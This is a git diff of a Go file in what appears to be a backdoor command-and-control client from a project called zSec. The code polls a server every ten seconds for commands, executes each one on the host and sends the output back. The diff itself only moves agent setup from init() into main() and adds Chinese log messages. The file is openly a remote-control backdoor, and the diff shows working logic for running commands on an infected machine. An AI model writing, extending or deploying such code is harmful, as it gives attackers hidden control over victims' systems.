@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"github.com/zhangweijie11/zSec/backdoor/command_control/client/models"
 	"io"
 	"net/http"
 	"net/url"
@@ -13,7 +14,7 @@ import (
 	"time"
 )
 
-var ValidAgent *Agent
+var ValidAgent *models.Agent
 
 type Command struct {
 	Id         int64     `json:"id"`
@@ -22,16 +23,6 @@ type Command struct {
 	Status     int       `json:"status"`
 	CreateTime time.Time `xorm:"created"`
 	UpdateTime time.Time `xorm:"updated"`
-}
-
-func init() {
-	debug := true
-	agent, err := NewAgent(debug, "http")
-	if err != nil {
-		os.Exit(0)
-	}
-
-	ValidAgent = agent
 }
 
 func Ping() {
@@ -50,7 +41,7 @@ func Ping() {
 }
 
 func ExecCommand() {
-	fmt.Println("agent: ", ValidAgent)
+	fmt.Println("展示agent: ", ValidAgent)
 	url := fmt.Sprintf("%v/cmd/%v", ValidAgent.URL, ValidAgent.AgentId)
 
 	beat := time.Tick(10 * time.Second)
@@ -64,7 +55,7 @@ func ExecCommand() {
 				err = json.Unmarshal(r, &cmds)
 				for _, cmd := range cmds {
 					ret, err := execCmd(cmd.Content)
-					fmt.Println(cmd, ret, err)
+					fmt.Println("执行命令结束！", cmd, ret, err)
 					_ = submitCmd(cmd.Id, ret)
 				}
 				_ = resp.Body.Close()
@@ -99,6 +90,13 @@ func submitCmd(id int64, result string) error {
 }
 
 func main() {
+	debug := true
+	agent, err := models.NewAgent(debug, "http")
+	if err != nil {
+		os.Exit(0)
+	}
+
+	ValidAgent = agent
 	go Ping()
 	ExecCommand()
 }
